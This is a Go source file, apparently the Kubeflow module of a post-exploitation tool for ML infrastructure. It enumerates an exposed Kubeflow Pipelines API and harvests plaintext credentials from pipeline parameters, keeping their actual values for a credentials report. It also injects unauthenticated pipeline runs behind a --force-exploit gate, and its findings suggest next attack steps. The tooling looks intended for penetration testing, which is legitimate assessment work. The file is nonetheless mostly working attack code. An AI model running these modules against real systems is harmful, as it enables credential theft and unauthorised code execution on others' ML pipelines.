package main

import (
	"fmt"
	"strings"

	"github.com/spf13/cobra"

	exploitcommon "github.com/professor-moody/aipostex/pkg/exploit/common"
	"github.com/professor-moody/aipostex/pkg/exploit/kubeflow"
	"github.com/professor-moody/aipostex/pkg/exploit/mlflow"
	"github.com/professor-moody/aipostex/pkg/report"
)

var (
	kubeflowTarget       string
	kubeflowHeaders      []string
	kubeflowNamespace    string
	kubeflowPipelineID   string
	kubeflowExperimentID string
	kubeflowRunName      string
	kubeflowParams       []string
)

var kubeflowCmd = &cobra.Command{
	Use:   "kubeflow",
	Short: "Enumerate and exploit Kubeflow Pipelines API",
	Long: `Post-exploitation module for Kubeflow Pipelines.

Kubeflow Pipelines exposes a REST API for managing ML pipelines, runs, and experiments.
Unauthenticated access enables pipeline enumeration and arbitrary run creation.

Examples:
  aipostex kubeflow --target http://10.0.0.30:8080 enum
  aipostex kubeflow --target http://10.0.0.30:8080 pipelines
  aipostex kubeflow --target http://10.0.0.30:8080 runs
  aipostex kubeflow --target http://10.0.0.30:8080 notebooks --namespace kubeflow
  aipostex kubeflow --target http://10.0.0.30:8080 run-pipeline --pipeline-id <pipeline-id> --run-name test --force-exploit`,
	Example: strings.Join([]string{
		formatCommandExample("kubeflow --target http://127.0.0.1:8080 enum"),
		formatCommandExample("kubeflow --target http://127.0.0.1:8080 pipelines"),
		formatCommandExample("kubeflow --target http://127.0.0.1:8080 run-pipeline --pipeline-id <pipeline-id> --run-name test --force-exploit"),
	}, "\n"),
}

var kfEnumCmd = &cobra.Command{
	Use:     "enum",
	Short:   "Enumerate Kubeflow Pipelines API reachability and version",
	Example: formatCommandExample("kubeflow --target http://127.0.0.1:8080 enum"),
	RunE:    runKFEnum,
}

var kfPipelinesCmd = &cobra.Command{
	Use:     "pipelines",
	Short:   "List accessible ML pipelines",
	Example: formatCommandExample("kubeflow --target http://127.0.0.1:8080 pipelines"),
	RunE:    runKFPipelines,
}

var kfRunsCmd = &cobra.Command{
	Use:     "runs",
	Short:   "List pipeline runs",
	Example: formatCommandExample("kubeflow --target http://127.0.0.1:8080 runs"),
	RunE:    runKFRuns,
}

var kfExperimentsCmd = &cobra.Command{
	Use:     "experiments",
	Short:   "List experiments",
	Example: formatCommandExample("kubeflow --target http://127.0.0.1:8080 experiments"),
	RunE:    runKFExperiments,
}

var kfNotebooksCmd = &cobra.Command{
	Use:     "notebooks",
	Short:   "List Kubeflow Notebooks in a namespace",
	Example: formatCommandExample("kubeflow --target http://127.0.0.1:8080 notebooks --namespace kubeflow"),
	RunE:    runKFNotebooks,
}

var kfRunPipelineCmd = &cobra.Command{
	Use:   "run-pipeline",
	Short: "Create a new pipeline run (gated)",
	Long: `Create a new pipeline run via the Kubeflow Pipelines API.

This is an active exploit action and requires --force-exploit.`,
	Example: formatCommandExample("kubeflow --target http://127.0.0.1:8080 run-pipeline --pipeline-id <pipeline-id> --run-name test --force-exploit"),
	RunE:    runKFRunPipeline,
}

func init() {
	kubeflowCmd.PersistentFlags().StringVarP(&kubeflowTarget, "target", "t", "", "Kubeflow URL (required)")
	kubeflowCmd.PersistentFlags().StringSliceVar(&kubeflowHeaders, "header", nil, "Additional HTTP header(s)")
	kubeflowCmd.PersistentFlags().StringVar(&kubeflowNamespace, "namespace", "kubeflow", "Kubernetes namespace for notebook listing")

	kfRunPipelineCmd.Flags().StringVar(&kubeflowPipelineID, "pipeline-id", "", "Pipeline ID to run (required)")
	kfRunPipelineCmd.Flags().StringVar(&kubeflowExperimentID, "experiment-id", "", "Experiment ID (optional)")
	kfRunPipelineCmd.Flags().StringVar(&kubeflowRunName, "run-name", "", "Run name (required)")
	kfRunPipelineCmd.Flags().StringSliceVar(&kubeflowParams, "param", nil, "Pipeline parameters as key=value pairs")

	kubeflowCmd.AddCommand(kfEnumCmd, kfPipelinesCmd, kfRunsCmd, kfExperimentsCmd, kfNotebooksCmd, kfRunPipelineCmd)
}

func newKFClient() (*kubeflow.Client, error) {
	if strings.TrimSpace(kubeflowTarget) == "" {
		return nil, missingFlagError("target", formatCommandExample("kubeflow --target http://127.0.0.1:8080 enum"))
	}
	headers, err := exploitcommon.ParseHeaderFlags(kubeflowHeaders)
	if err != nil {
		return nil, err
	}
	target := normalizeAndWarnTarget(kubeflowTarget)
	kubeflowTarget = target
	client, err := kubeflow.NewClient(currentContext(), target, cfg.Timeout, headers)
	if err != nil {
		return nil, err
	}
	httpClient, err := cfg.NewHTTPClient()
	if err != nil {
		return nil, err
	}
	client.HTTPClient = httpClient
	return client, nil
}

func runKFEnum(_ *cobra.Command, _ []string) error {
	client, err := newKFClient()
	if err != nil {
		return err
	}
	info, err := client.Enumerate()
	if err != nil {
		return fmt.Errorf("enumerating kubeflow: %w", err)
	}

	// Bare Pipelines-API enumeration is recon/reachable — Info, consistent with the other
	// enum findings. Reachability (the API answered with a version) is not an exposed
	// capability; higher severity belongs on a concrete exposure (readable pipelines/secrets).
	severity := report.SeverityInfo

	finding := newExploitFinding(
		report.SourceKubeflow,
		kubeflowTarget,
		"Kubeflow Pipelines API enumerated",
		severity,
		fmt.Sprintf("Kubeflow reachable (api_version=%s, namespace=%s)", safeLabel(info.APIVersion), safeLabel(info.Namespace)),
		map[string]interface{}{
			"module":      "kubeflow",
			"action":      "enum",
			"mutating":    false,
			"provider":    "kubeflow",
			"api_version": info.APIVersion,
			"namespace":   info.Namespace,
			"reachable":   info.Reachable,
		},
	)
	finding.Metadata = applyStageLanded(finding.Metadata, "recon", "reachable", "kubeflow-enum", "server")

	enumPlan := workflowPlan{
		Target:    kubeflowTarget,
		Stage:     "enum",
		Rationale: "Kubeflow Pipelines API access should progress through pipeline, run, and experiment enumeration before attempting run injection.",
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("kubeflow --target "+kubeflowTarget+" pipelines"), "List accessible ML pipelines and their parameters.", false, 10),
			newWorkflowRecommendation(formatCommandExample("kubeflow --target "+kubeflowTarget+" runs"), "List existing pipeline runs and status.", false, 20),
			newWorkflowRecommendation(formatCommandExample("kubeflow --target "+kubeflowTarget+" experiments"), "List experiments.", false, 30),
		},
	}
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, enumPlan)

	infof("Enumerated Kubeflow (api_version=%s)", safeLabel(info.APIVersion))
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:              "kubeflow",
		Action:              "enum",
		ResourcesEnumerated: 1,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{enumPlan},
	})
}

func runKFPipelines(_ *cobra.Command, _ []string) error {
	client, err := newKFClient()
	if err != nil {
		return err
	}
	pipelines, total, err := client.ListPipelines()
	partialFailures := 0
	if err != nil && exploitcommon.IsPartialResult(err) {
		warnf("kubeflow pipelines enumeration incomplete: %v", err)
		partialFailures = 1
	} else if err != nil {
		return fmt.Errorf("listing kubeflow pipelines: %w", err)
	}

	findings := make([]report.Finding, 0, len(pipelines)+1)
	summary := newExploitFinding(
		report.SourceKubeflow,
		kubeflowTarget,
		"Kubeflow Pipelines enumerated",
		report.SeverityHigh,
		fmt.Sprintf("Discovered %d pipeline(s) (total=%d)", len(pipelines), total),
		map[string]interface{}{
			"module":         "kubeflow",
			"action":         "pipelines",
			"mutating":       false,
			"provider":       "kubeflow",
			"pipeline_count": len(pipelines),
		},
	)
	findings = append(findings, summary)

	for _, p := range pipelines {
		meta := map[string]interface{}{
			"module":        "kubeflow",
			"action":        "pipelines",
			"mutating":      false,
			"provider":      "kubeflow",
			"pipeline_id":   p.ID,
			"pipeline_name": p.Name,
			"param_count":   len(p.Parameters),
		}
		// Surface the pipeline parameter name=value pairs as evidence — pipeline
		// configs routinely carry plaintext secrets (HF/AWS/Snowflake creds), the
		// core "secrets in pipeline config" exposure. Scan them with the shared
		// sensitive-value detector and flag any hits in metadata.
		var evidenceLines []string
		paramMap := make(map[string]string, len(p.Parameters))
		for _, pp := range p.Parameters {
			evidenceLines = append(evidenceLines, fmt.Sprintf("%s=%s", pp.Name, pp.Value))
			paramMap[pp.Name] = pp.Value
		}
		if sensitive := mlflow.ExtractSensitiveParams(paramMap, ""); len(sensitive) > 0 {
			meta["sensitive_param_count"] = len(sensitive)
			hints := make([]string, 0, len(sensitive))
			extractedCredentials := make([]interface{}, 0, len(sensitive))
			for _, s := range sensitive {
				hints = append(hints, s.Key)
				// Feed the structured credential channel so `report view --credentials`
				// lists each pipeline-param secret with its real value, not just a count.
				extractedCredentials = append(extractedCredentials, map[string]interface{}{
					"type":          "kubeflow-pipeline-param",
					"name":          s.Key,
					"value":         s.Value,
					"source":        "kubeflow-pipeline-param",
					"source_target": kubeflowTarget,
					"target_url":    kubeflowTarget,
					"chainable":     false,
					"note":          fmt.Sprintf("pipeline %q (id=%s)", p.Name, p.ID),
				})
			}
			meta["sensitive_params"] = hints
			meta["extracted_credentials"] = extractedCredentials
		}
		f := newExploitFinding(
			report.SourceKubeflow,
			kubeflowTarget,
			fmt.Sprintf("Kubeflow pipeline: %s", p.Name),
			report.SeverityHigh,
			fmt.Sprintf("Pipeline %q (id=%s, params=%d)", p.Name, p.ID, len(p.Parameters)),
			meta,
		)
		if len(evidenceLines) > 0 {
			f.Evidence = strings.Join(evidenceLines, "\n")
		}
		findings = append(findings, f)
	}

	var workflowPlans []workflowPlan
	if len(pipelines) > 0 {
		plan := buildKFPipelinesWorkflowPlan(kubeflowTarget, pipelines)
		summary.Metadata = attachWorkflowToMetadata(summary.Metadata, plan)
		workflowPlans = append(workflowPlans, plan)
	}

	infof("Listed %d Kubeflow pipeline(s)", len(pipelines))
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "kubeflow",
		Action:              "pipelines",
		ResourcesEnumerated: len(pipelines),
		PartialFailures:     partialFailures,
		Mutating:            false,
		WorkflowPlans:       workflowPlans,
	})
}

func runKFRuns(_ *cobra.Command, _ []string) error {
	client, err := newKFClient()
	if err != nil {
		return err
	}
	runs, total, err := client.ListRuns()
	partialFailures := 0
	if err != nil && exploitcommon.IsPartialResult(err) {
		warnf("kubeflow runs enumeration incomplete: %v", err)
		partialFailures = 1
	} else if err != nil {
		return fmt.Errorf("listing kubeflow runs: %w", err)
	}

	findings := make([]report.Finding, 0, len(runs)+1)
	summary := newExploitFinding(
		report.SourceKubeflow,
		kubeflowTarget,
		"Kubeflow pipeline runs enumerated",
		report.SeverityHigh,
		fmt.Sprintf("Discovered %d run(s) (total=%d)", len(runs), total),
		map[string]interface{}{
			"module":    "kubeflow",
			"action":    "runs",
			"mutating":  false,
			"provider":  "kubeflow",
			"run_count": len(runs),
		},
	)
	findings = append(findings, summary)

	for _, r := range runs {
		f := newExploitFinding(
			report.SourceKubeflow,
			kubeflowTarget,
			fmt.Sprintf("Kubeflow run: %s", r.Name),
			report.SeverityMedium,
			fmt.Sprintf("Run %q (id=%s, status=%s, pipeline=%s)", r.Name, r.ID, safeLabel(r.Status), safeLabel(r.PipelineID)),
			map[string]interface{}{
				"module":      "kubeflow",
				"action":      "runs",
				"mutating":    false,
				"provider":    "kubeflow",
				"run_id":      r.ID,
				"run_name":    r.Name,
				"run_status":  r.Status,
				"pipeline_id": r.PipelineID,
			},
		)
		findings = append(findings, f)
	}

	firstPipelineID := ""
	for _, r := range runs {
		if r.PipelineID != "" {
			firstPipelineID = r.PipelineID
			break
		}
	}
	plan := buildKFExploitWorkflowPlan(kubeflowTarget, "runs", firstPipelineID)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, plan)

	infof("Listed %d Kubeflow run(s)", len(runs))
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "kubeflow",
		Action:              "runs",
		ResourcesEnumerated: len(runs),
		PartialFailures:     partialFailures,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func runKFExperiments(_ *cobra.Command, _ []string) error {
	client, err := newKFClient()
	if err != nil {
		return err
	}
	exps, total, err := client.ListExperiments()
	partialFailures := 0
	if err != nil && exploitcommon.IsPartialResult(err) {
		warnf("kubeflow experiments enumeration incomplete: %v", err)
		partialFailures = 1
	} else if err != nil {
		return fmt.Errorf("listing kubeflow experiments: %w", err)
	}

	findings := make([]report.Finding, 0, len(exps)+1)
	summary := newExploitFinding(
		report.SourceKubeflow,
		kubeflowTarget,
		"Kubeflow experiments enumerated",
		report.SeverityMedium,
		fmt.Sprintf("Discovered %d experiment(s) (total=%d)", len(exps), total),
		map[string]interface{}{
			"module":           "kubeflow",
			"action":           "experiments",
			"mutating":         false,
			"provider":         "kubeflow",
			"experiment_count": len(exps),
		},
	)
	findings = append(findings, summary)

	for _, e := range exps {
		f := newExploitFinding(
			report.SourceKubeflow,
			kubeflowTarget,
			fmt.Sprintf("Kubeflow experiment: %s", e.Name),
			report.SeverityMedium,
			fmt.Sprintf("Experiment %q (id=%s)", e.Name, e.ID),
			map[string]interface{}{
				"module":          "kubeflow",
				"action":          "experiments",
				"mutating":        false,
				"provider":        "kubeflow",
				"experiment_id":   e.ID,
				"experiment_name": e.Name,
			},
		)
		findings = append(findings, f)
	}

	plan := buildKFExploitWorkflowPlan(kubeflowTarget, "experiments", "")
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, plan)

	infof("Listed %d Kubeflow experiment(s)", len(exps))
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "kubeflow",
		Action:              "experiments",
		ResourcesEnumerated: len(exps),
		PartialFailures:     partialFailures,
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func runKFNotebooks(_ *cobra.Command, _ []string) error {
	client, err := newKFClient()
	if err != nil {
		return err
	}
	ns := kubeflowNamespace
	if strings.TrimSpace(ns) == "" {
		ns = "kubeflow"
	}
	notebooks, err := client.ListNotebooks(ns)
	if err != nil {
		return fmt.Errorf("listing kubeflow notebooks: %w", err)
	}

	findings := make([]report.Finding, 0, len(notebooks))
	for _, nb := range notebooks {
		f := newExploitFinding(
			report.SourceKubeflow,
			kubeflowTarget,
			fmt.Sprintf("Kubeflow Notebook: %s", nb.Name),
			report.SeverityHigh,
			fmt.Sprintf("Notebook %q (namespace=%s, status=%s, url=%s)", nb.Name, nb.Namespace, safeLabel(nb.Status), nb.URL),
			map[string]interface{}{
				"module":    "kubeflow",
				"action":    "notebooks",
				"mutating":  false,
				"provider":  "kubeflow",
				"notebook":  nb.Name,
				"namespace": nb.Namespace,
				"status":    nb.Status,
				"url":       nb.URL,
			},
		)
		findings = append(findings, f)
	}

	if len(findings) == 0 {
		findings = append(findings, newExploitFinding(
			report.SourceKubeflow,
			kubeflowTarget,
			"Kubeflow Notebooks: none in namespace",
			report.SeverityInfo,
			fmt.Sprintf("No notebooks found in namespace %q", ns),
			map[string]interface{}{
				"module":    "kubeflow",
				"action":    "notebooks",
				"mutating":  false,
				"provider":  "kubeflow",
				"namespace": ns,
			},
		))
	}

	firstURL := ""
	for _, nb := range notebooks {
		if nb.URL != "" {
			firstURL = nb.URL
			break
		}
	}
	plan := buildKFExploitWorkflowPlan(kubeflowTarget, "notebooks", firstURL)
	findings[0].Metadata = attachWorkflowToMetadata(findings[0].Metadata, plan)

	infof("Listed %d Kubeflow notebook(s) in namespace %q", len(notebooks), ns)
	return writeExploitFindingsWithSummary(findings, &exploitSummary{
		Module:              "kubeflow",
		Action:              "notebooks",
		ResourcesEnumerated: len(notebooks),
		Mutating:            false,
		WorkflowPlans:       []workflowPlan{plan},
	})
}

func runKFRunPipeline(_ *cobra.Command, _ []string) error {
	if err := requireForceExploit("kubeflow run-pipeline"); err != nil {
		return err
	}
	if strings.TrimSpace(kubeflowPipelineID) == "" {
		return missingFlagError("pipeline-id", formatCommandExample("kubeflow --target http://127.0.0.1:8080 run-pipeline --pipeline-id <pipeline-id> --run-name test --force-exploit"))
	}
	if strings.TrimSpace(kubeflowRunName) == "" {
		return missingFlagError("run-name", formatCommandExample("kubeflow --target http://127.0.0.1:8080 run-pipeline --pipeline-id <pipeline-id> --run-name test --force-exploit"))
	}

	client, err := newKFClient()
	if err != nil {
		return err
	}

	params := make(map[string]string)
	for _, p := range kubeflowParams {
		parts := strings.SplitN(p, "=", 2)
		if len(parts) == 2 {
			params[parts[0]] = parts[1]
		}
	}

	result, err := client.CreateRun(kubeflowPipelineID, kubeflowExperimentID, kubeflowRunName, params)
	if err != nil {
		return fmt.Errorf("creating run: %w", err)
	}

	severity := report.SeverityHigh
	if !result.Success {
		severity = report.SeverityMedium
	}

	finding := newExploitFinding(
		report.SourceKubeflow,
		kubeflowTarget,
		"Kubeflow unauthenticated pipeline run injection",
		severity,
		fmt.Sprintf("Run created (run_id=%s, success=%t, status=%d)", safeLabel(result.RunID), result.Success, result.StatusCode),
		map[string]interface{}{
			"module":      "kubeflow",
			"action":      "run-pipeline",
			"mutating":    true,
			"provider":    "kubeflow",
			"pipeline_id": kubeflowPipelineID,
			"run_name":    kubeflowRunName,
			"run_id":      result.RunID,
			"success":     result.Success,
		},
	)
	// A created pipeline run is a landed mutation (impact/influenced); a run that
	// actually executes attacker steps would be a separate execution-confirmed finding.
	stage, landed := "recon", "reachable"
	if result.Success {
		stage, landed = "impact", "influenced"
	}
	finding.Metadata = applyStageLanded(finding.Metadata, stage, landed, "kubeflow-run-pipeline", "pipeline-run")

	plan := buildKFExploitWorkflowPlan(kubeflowTarget, "run-pipeline", "")
	finding.Metadata = attachWorkflowToMetadata(finding.Metadata, plan)

	infof("Pipeline run created (run_id=%s, success=%t)", safeLabel(result.RunID), result.Success)
	return writeExploitFindingsWithSummary([]report.Finding{finding}, &exploitSummary{
		Module:        "kubeflow",
		Action:        "run-pipeline",
		Mutating:      true,
		WorkflowPlans: []workflowPlan{plan},
	})
}
